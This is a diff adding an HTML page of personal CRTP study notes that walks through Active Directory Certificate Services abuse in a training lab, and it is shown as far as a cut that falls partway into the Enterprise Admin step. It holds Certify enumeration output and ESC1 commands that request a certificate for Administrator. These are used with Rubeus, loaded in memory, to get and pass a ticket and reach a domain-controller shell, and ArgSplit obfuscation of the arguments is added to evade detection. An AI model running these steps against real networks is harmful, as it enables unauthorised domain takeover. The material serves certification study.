@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTP Part 19 - ADCS Attacks | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+      max-width: 100%;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content ul, .goad-content ol {
+      color: var(--light-gray);
+      margin: 20px 0;
+      padding-left: 40px;
+      font-size: 20px;
+    }
+    
+    .goad-content li {
+      margin-bottom: 10px;
+      color: var(--light-gray);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .goad-content blockquote {
+      border-left: 3px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray);
+      font-style: italic;
+      font-size: 20px;
+    }
+    
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: block;
+      padding: 10px 15px;
+      border-radius: 8px;
+      transition: all 0.3s;
+      font-size: 16px;
+    }
+    
+    .goad-sidebar-list a:hover,
+    .goad-sidebar-list a.active {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-sidebar-list a.active {
+      background: var(--orange-yellow-crayola);
+      color: var(--eerie-black-1);
+      font-weight: var(--fw-500);
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-powershell-overview.html">PowerShell Overview</a></li>
+          <li><a href="part-2-powershell-detections.html">PowerShell Detections</a></li>
+          <li><a href="part-3-enumeration.html">Enumeration</a></li>
+          <li><a href="part-4-privilege-escalation.html">Privilege Escalation</a></li>
+          <li><a href="part-5-privesc-domain-admin.html">Privilege Escalation via Domain Admin</a></li>
+          <li><a href="part-6-golden-ticket.html">Golden Ticket</a></li>
+          <li><a href="part-7-silver-ticket.html">Silver Ticket</a></li>
+          <li><a href="part-8-diamond-ticket.html">Diamond Ticket</a></li>
+          <li><a href="part-9-dsrm-credentials.html">Abusing DSRM Credentials</a></li>
+          <li><a href="part-10-dcsync-attack.html">DCSync Attack</a></li>
+          <li><a href="part-11-security-descriptor.html">Security Descriptor Abuse</a></li>
+          <li><a href="part-12-asrep-roasting.html">ASREP-Roasting Attack</a></li>
+          <li><a href="part-13-unconstrained-delegation.html">Unconstrained Delegation</a></li>
+          <li><a href="part-14-constrained-delegation.html">Constrained Delegation</a></li>
+          <li><a href="part-15-rbcd.html">Resource-Based Constrained Delegation</a></li>
+          <li><a href="part-16-enterprise-trust-ticket.html">Enterprise Trust - SID-History with Trust Ticket</a></li>
+          <li><a href="part-17-enterprise-krbtgt.html">Enterprise Trust - SID-History with KRBTGT</a></li>
+          <li><a href="part-18-crossforest-trust.html">CrossForest Trust - Trust Flow</a></li>
+          <li><a href="part-19-adcs-attacks.html" class="active">ADCS Attacks</a></li>
+          <li><a href="part-20-trust-links.html">Trust Links Abuse</a></li>
+          <li><a href="part-21-mde-mdi-bypass.html">MDE/MDI Bypass</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">ADCS Attacks</header>
+        
+        <section class="goad-content">
+          
+<h1>CRTP - Certified Red Team Professional</h1>
+
+
+<h2>ADCS Attacks</h2>
+
+
+<p>Active Directory Certificate Services (ADCS) is a crucial component of Microsoft's Active Directory (AD) infrastructure. </p>
+<p>It enables organizations to create and manage their own internal public key infrastructure (PKI) for issuing digital certificates. </p>
+<p>These certificates are used for various purposes such as encrypted email, digital signatures, and user authentication within the organization's environment.</p>
+<h3>Key Components of ADCS</h3>
+
+
+<p>1. Internal Root CA: ADCS allows organizations to create their own internal root certificate authority (CA). This internal root CA is responsible for issuing digital certificates to various entities within the organization.</p>
+<p>1. Certificate Templates: ADCS provides a set of pre-defined certificate templates that can be used to generate digital certificates. These templates define the properties and settings for the certificates, such as the subject name, public key, and expiration date.</p>
+<p>1. Enrollment Services: ADCS includes enrollment services that manage the process of requesting, issuing, and revoking digital certificates. These services ensure that only authorized entities can request and obtain certificates.</p>
+<p>1. Certificate Revocation: ADCS includes mechanisms for revoking certificates that are no longer valid or have been compromised. This ensures that the organization's PKI remains secure and trustworthy.</p>
+<h3>Critical Points in ADCS That Can Be Exploited</h3>
+
+
+<p>1. Certificate Template Misconfigurations: If certificate templates are not properly configured, they can be exploited to issue certificates that can be used for malicious purposes. For example, a template that allows the subject name to be supplied in the request can be used to request a certificate for any user or computer.</p>
+<p>1. Enrollment Service Misconfigurations: If enrollment services are not properly configured, they can be exploited to request and obtain certificates without proper authorization. For example, if an enrollment service is configured to allow any user to request a certificate, an attacker can use this to obtain a certificate for a high-privileged user.</p>
+<p>1. Certificate Revocation List (CRL) Misconfigurations: If CRLs are not properly configured or updated, they can be exploited to issue certificates that are not revoked. This can lead to the use of compromised or expired certificates.</p>
+<p>1. Local Configuration: Each ADCS server can be locally configured to tune its behavior regarding day-to-day operations. This local configuration can be exploited if not properly secured, allowing unauthorized access to certificate management functions.</p>
+<p>1. Role-Based Access Control (RBAC): ADCS includes RBAC mechanisms to limit access to certificate management functions. However, if these mechanisms are not properly configured or if there are existing misconfigurations, they can be exploited to gain unauthorized access.</p>
+<h3>Exploiting ADCS for Elevation of Privileges</h3>
+
+
+<p>1. PKINIT: ADCS can be used to issue certificates that can be used for PKINIT, which allows for the authentication of users and computers. If an attacker can obtain a certificate for a high-privileged user, they can use PKINIT to authenticate as that user and gain elevated privileges.</p>
+<p>1. Certificate Templates with Extended Key Usages: If a certificate template includes extended key usages such as Client Authentication or Microsoft Smartcard Logon, it can be used to request a certificate that allows for authentication as a high-privileged user.</p>
+
+<p>The most common vulnerabilities in Active Directory Certificate Services (AD CS) include:</p>
+<p>1. Certificate Template Misconfigurations:</p>
+<p>1. PKI Object Access Control:</p>
+<p>1. Certificate Authority Access Control:</p>
+<p>1. NTLM Relay to Active Directory Certificate Services HTTP Endpoints:</p>
+<p>1. Lack of Auditing:</p>
+<p>1. Vulnerable PKI Object Access Control:</p>
+<p>1. EDITF_ATTRIBUTESUBJECTALTNAME2 Flag:</p>
+<p>1. Certificate Revocation List (CRL) Misconfigurations:</p>
+<p>1. Local Configuration:</p>
+<p>1. Role-Based Access Control (RBAC) Misconfigurations:</p>
+<p>These vulnerabilities can be exploited to gain unauthorized access, escalate privileges, and compromise the security of the AD CS infrastructure.</p>
+
+
+<h1>Enumeration</h1>
+
+
+<p>To enumerate ADCS we can use Certify.exe, asking it to bring information about ADCS in the domain.</p>
+<p>Certify.exe cas</p>
+<pre><code>
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+
+[*] Root CAs
+
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+
+
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+
+
+[*] Enterprise/Enrollment CAs:
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        CA-Integration
+        HTTPSCertificates
+        SmartCardEnrollment-Agent
+        SmartCardEnrollment-Users
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        SubCA
+        Administrator</code></pre>
+
+
+<p>When you execute the command certify.exe cas in a Windows command prompt, the following types of enumeration will occur:</p>
+<p>1. Certificate Authority (CA) Information:</p>
+<p>1. Certificate Templates:</p>
+<p>1. Certificate Enrollment:</p>
+<p>1. Certificate Revocation List (CRL):</p>
+<p>1. Certificate Authority (CA) Roles:</p>
+<p>1. Certificate Authority (CA) Configuration:</p>
+<p>These enumerations will provide detailed information about the CA server, certificate templates, certificate enrollment, CRLs, and CA roles, which can be useful to identify potential vulnerabilities and misconfigurations in the AD CS infrastructure.</p>
+
+
+<p>Here is a brief summary of the output from certify.exe:</p>
+<h3>Summary</h3>
+
+
+<li>Certificate Authorities: The output lists three types of certificate authorities: Root CAs, NTAuthCertificates, and Enterprise/Enrollment CAs.</li>
+<li>Root CAs: The Root CAs section lists the subject name, thumbprint, serial number, start date, end date, and certificate chain for the root certificate authority.</li>
+<li>NTAuthCertificates: The NTAuthCertificates section lists the subject name, thumbprint, serial number, start date, end date, and certificate chain for the certificates that enable NTLM authentication.</li>
+<li>Enterprise/Enrollment CAs: The Enterprise/Enrollment CAs section lists the enterprise CA name, DNS hostname, full name, flags, subject name, thumbprint, serial number, start date, end date, and certificate chain for the enterprise CA.</li>
+<li>UserSpecifiedSAN: The output indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names.</li>
+<li>CA Permissions: The output lists the permissions for the CA, including the owner and access rights.</li>
+<li>Enabled Certificate Templates: The output lists the enabled certificate templates for the enterprise CA.</li>
+<h3>Key Points</h3>
+
+
+<li>Certificate Authority Information: The output provides detailed information about the certificate authorities, including their subject names, thumbprints, serial numbers, start dates, end dates, and certificate chains.</li>
+<li>Certificate Template Information: The output lists the enabled certificate templates for the enterprise CA.</li>
+<li>UserSpecifiedSAN: The output indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names.</li>
+<li>CA Permissions: The output lists the permissions for the CA, including the owner and access rights.</li>
+<h3>Potential Issues</h3>
+
+
+<li>Certificate Expiration: The output lists the start and end dates for each certificate, indicating potential expiration issues.</li>
+<li>Certificate Chain Issues: The output lists the certificate chain for each certificate, indicating potential chain issues.</li>
+<li>UserSpecifiedSAN: The output indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names, which could be a potential security issue.</li>
+
+<p>The output from certify.exe provides detailed information about the certificate authorities, certificate templates, and permissions for the enterprise CA. It highlights potential issues such as certificate expiration and certificate chain issues, and indicates that the UserSpecifiedSAN flag is set, allowing users to specify Subject Alternative Names.</p>
+
+<p>Now let’s list all the templates configured in this ADCS in the domain. The following command will enumerate all Templates configured.</p>
+<p>Cerify.exe find</p>
+<pre><code>
+    Code Snippet-------------------
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Users
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 1
+    Application Policies                  : Certificate Request Agent
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : HTTPSCertificates
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+Code-Snippet----------------</code></pre>
+
+
+<p>Above we the output has been snippet, but we have several  Templates configured… </p>
+
+
+<h1>Privilege Escalation to Domain Admin and Enterprise Admin using ESC1</h1>
+
+
+<p>Let’s use another command to find more juicy information. We can enumerate all templates with flag enrolleeSuppliesSubject set.</p>
+<p>The ENROLLEE_SUPPLIES_SUBJECT flag is abusable in Active Directory Certificate Services (ADCS) because it allows the requester to specify the subject name in the certificate request. This flag is set in the certificate template and enables the requester to supply the subject name in the request without requiring additional approval for the certificate issuance. This means that an attacker can request a certificate with a subject name that is not the actual name of the requester, which can be used to impersonate another user or entity within the domain.</p>
+
+<p>Certify.exe find /enrolleeSuppliesSubject</p>
+<pre><code>   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+Enabled certificate templates where users can supply a SAN:
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : WebServer
+    Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : &lt;null&gt;
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SubCA
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : &lt;null&gt;
+    mspki-certificate-application-policy  : &lt;null&gt;
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : HTTPSCertificates
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</code></pre>
+
+
+
+<p>The HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. Recall that we are member of RDPUsers group. This means that we can request certificate for any user. From this we can request certificate of Administrator (Domain Admin)</p>
+<img src="./images/screenshot_151.png" alt="">
+
+
+
+<p>Requesting Certificate For Domain Admin (Administrator)</p>
+<p>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator</p>
+<img src="./images/screenshot_152.png" alt="">
+
+
+<p>Okay, let's break down the flags used in the certify.exe command provided:</p>
+<p>1. request:</p>
+<p>1. /ca:mcorp-dc.moneycorp.local\\moneycorp-MCORP-DC-CA:</p>
+<p>1. /template:"HTTPSCertificates":</p>
+<p>1. /altname:administrator:</p>
+<p>This command can be used to request a certificate with the "administrator" subject name.</p>
+
+<p>Now let’s copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to ESC1.pem</p>
+<p>We need to convert it to PFX to use it. I will use MrStark123 as the export password</p>
+<p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\ESC1-Domain_Admin.pfx</p>
+
+
+<h3>Using PELoader.exe for args encoding.</h3>
+
+
+<p>Back to cmdlet, PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+
+<p>ArgSplit.bat</p>
+<p>asktgt</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: asktgt
+set "z=t"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>Now let’s use PFX created  with Rubeus to request a TGT for Domain Admin - Administrator!</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /certificate:ESC1-Domain_Admin.pfx /password:MrStark123 /ptt</p>
+<img src="./images/screenshot_153.png" alt="">
+
+
+<p>As we can seen from the output above, the ticket has been successfully imported into our Cached Tickets, let’s enumerate it using klist command. </p>
+<p>klist</p>
+<img src="./images/screenshot_154.png" alt="">
+
+
+<p>Yes… we can confirm that our ticket as administrator has been imported to our Cached Tickets and we do have access as DollarCorp Domain Admin.</p>
+<p>winrs -r:dcorp-dc cmd</p>
+<img src="./images/screenshot_155.png" alt="">
+
+
+<p>Voila… We were able to escalate from a simple domain user to Domain Admin user.</p>
+
+
+<p>Now let’s use the same similar method to escalate from Domain Admin to Enterprise Admin.</p>
+<p>C:\AD\Tools>C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator</p>
+<p>Bare in mind that this time for Enterprise Admin, we are requesting using moneycorp.local\administrator, this way we are not requesting for the Administrator of the current domain which is dollarcorp.moneycorp.local, but we are requesting it for moneycorp.local which is the Parent Domain of dollarcorp.</p>
+
